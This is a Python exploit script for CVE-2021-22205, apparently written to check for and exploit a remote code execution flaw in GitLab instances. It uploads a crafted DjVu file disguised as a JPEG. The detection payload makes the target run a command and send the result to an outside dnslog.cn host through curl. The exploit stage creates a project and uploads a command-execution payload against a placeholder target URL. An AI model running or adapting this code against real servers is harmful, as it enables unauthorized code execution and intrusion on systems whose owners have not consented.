# Create by antx at 2021-10-29
import requests
from loguru import logger
import re
import random
import os

class CVE_2021_22205():
    @logger.catch(level='ERROR')
    def __init__(self):
        self.session = requests.Session()
        self.data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{curl `whoami`.q3ddlk.dnslog.cn} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Connection": "close",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
            "Accept-Encoding": "gzip, deflate"
        }
        self.flag = 'Failed to process image'
        self.project_name = f'project{random.randrange(1, 10000)}'

    @logger.catch(level='ERROR')
    def extract_token(self, response: str) ->str:
        csrf_token = re.findall('csrf-token" content="(.*?)" />', response)[0]
        return csrf_token

    @logger.catch(level='ERROR')
    def handshake(self, url: str):
        resp = self.session.get(f'{url}/users/sign_in')
        return self.extract_token(resp.text)

    @logger.catch(level='ERROR')
    def poc(self, url: str):
        resp = self.session.post(f'{url}/uploads/user', data=self.data, headers=self.headers).content.decode('utf-8')
        if self.flag in resp:
            logger.info(f'[+] {url} have CVE-2021-22205 Vulnerability')
            return True
        logger.info(f'[x] {url} have no CVE-2021-22205 Vulnerability')
        return False

    @logger.catch(level='ERROR')
    def create_project(self, url: str):
        project_url = f'{url}/projects/new'
        resp = self.session.get(project_url)
        csrf_token = self.extract_token(resp.text)
        csrf_token = csrf_token.replace("==", "%3D%3D")
        csrf_token = csrf_token.replace("+", "%2B")
        cookies = {
            'sidebar_collapsed': 'false',
            'event_filter': 'all',
            'hide_auto_devops_implicitly_enabled_banner_1': 'false',
            "_gitlab_session": self.session.cookies["_gitlab_session"],
        }
        payload = f"utf8=%E2%9C%93&authenticity_token={csrf_token}&project%5Bci_cd_only%5D=false&project%5Bname%5D={self.project_name}&project%5Bpath%5D={self.project_name}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=20"
        result = self.session.post(f'{url}/projects', data=payload, cookies=cookies, verify=False)
        if "The change you requested was rejected." in result.text:
            exit('[x] Exploit failed, check input params')
        else:
            logger.info("[+] Successfully created project")
        return cookies

    @logger.catch(level='ERROR')
    def rce_payload(self, command: str = "whoami"):
        rce_payload = f'(metadata\n\t(Copyright "\\\n" . qx{{{command}}} . \\\n" b ") )\n'.encode()
        # Write payload to a text file
        with open("1.txt", "wb") as f:
            f.write(rce_payload)
        # Create a djvu file with metadata payload, and then rename it to .jpg file
        os.system("djvumake 1.djvu INFO=0,0 BGjp=/dev/null ANTa=1.txt && mv 1.djvu 1.jpg")

    @logger.catch(level='ERROR')
    def upload_file(self, url: str, cook: dict):
        username = 'admin'
        try:
            rsp = self.session.get(f"{url}/{username}/{self.project_name}/-/snippets/new", cookies=cook)

        except IndexError as indexerror:
            # Add check for older gitlab versions
            rsp = self.session.get(f"{url}/{username}/{self.project_name}/snippets/new", cookies=cook)
        snippet_token = self.extract_token(rsp.text)

        upload_file_url = f"{url}/{username}/{self.project_name}/uploads"
        cookies = {
            'sidebar_collapsed': 'false',
            'event_filter': 'all',
            'hide_auto_devops_implicitly_enabled_banner_1': 'false',
            "_gitlab_session": self.session.cookies["_gitlab_session"]
        }

        files = {"file": ("1.jpg", open("1.jpg", "rb"), "image/jpeg")}
        resp = self.session.post(
            url=upload_file_url,
            files=files,
            headers={
                "X-CSRF-Token": snippet_token,
                "Referer": upload_file_url,
                "Accept": "application/json"
            }, cookies=cookies)

        if "The change you requested was rejected." in resp.text:
            exit("[x] Upload file failed")
        elif "Failed to process image" in resp.text:
            logger.info("[+] RCE triggered successfully")

    @logger.catch(level='ERROR')
    def cleanup(self):
        os.system("rm 1.jpg && rm 1.txt")

    @logger.catch(level='ERROR')
    def exp(self, url: str):
        cook = self.create_project(url)
        self.rce_payload()
        self.upload_file(url, cook)

    @logger.catch(level='ERROR')
    def dia(self, url: str, is_exp: bool = False):
        url = url.rstrip('/')
        csrf_token = self.handshake(url)
        self.headers['X-CSRF-Token'] = csrf_token
        is_poc = self.poc(url)
        if not is_poc:
            return
        if is_exp:
            self.exp(url)
            self.cleanup()

if __name__ == '__main__':
    target = 'https://xxx.xx'
    cve = CVE_2021_22205()
    cve.dia(target, True)
